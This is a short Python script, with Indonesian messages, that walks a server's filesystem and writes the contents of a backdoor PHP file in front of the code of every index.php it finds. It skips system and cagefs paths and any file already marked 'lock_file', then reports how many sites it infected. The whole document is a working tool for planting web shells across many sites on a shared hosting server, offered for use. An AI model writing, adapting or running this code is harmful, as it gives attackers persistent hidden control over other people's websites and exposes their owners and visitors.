#!/usr/bin/env python3
import os, sys

BQ_FILE = '/tmp/aa.php'
TARGET  = '/'

if len(sys.argv) >= 2:
    TARGET = sys.argv[1]
if len(sys.argv) >= 3:
    BQ_FILE = sys.argv[2]

if not os.path.exists(BQ_FILE):
    print('[!] File backdoor tidak ditemukan: %s' % BQ_FILE)
    sys.exit(1)

with open(BQ_FILE, 'rb') as f:
    BQ = f.read()

found = yes = skipped = errors = 0

def is_bad_path(path):
    blacklist = ('virtfs', 'proc', 'sys', 'cagefs', 'dev')
    for x in blacklist:
        if x in path.split(os.sep):
            return True
    return False

def safe_walk(base):
    for root, dirs, files in os.walk(base, followlinks=False):
        dirs[:] = [d for d in dirs if not is_bad_path(os.path.join(root, d))]

        for name in files:
            if name == 'index.php':
                yield os.path.join(root, name)

for f in safe_walk(TARGET):
    if is_bad_path(f):
        continue

    if not os.path.isfile(f) or os.path.islink(f):
        continue

    found += 1
    try:
        with open(f, 'rb') as fh:
            orig = fh.read()

        if b'lock_file' in orig:
            skipped += 1
            continue

        tmp = f + '.tmp'
        with open(tmp, 'wb') as t:
            t.write(BQ + b'\n' + orig)

        os.rename(tmp, f)
        os.chmod(f, 0o644)

        yes += 1
        print('YES: %s' % f)

    except OSError as e:
        if hasattr(e, 'errno') and e.errno in (30, 40):
            continue
        errors += 1
        print('ERROR: %s -> %s' % (f, e))

    except Exception as e:
        errors += 1
        print('ERROR: %s -> %s' % (f, e))

print('\nDone: %d yes | %d skipped | %d errors | %d total' % (yes, skipped, errors, found))
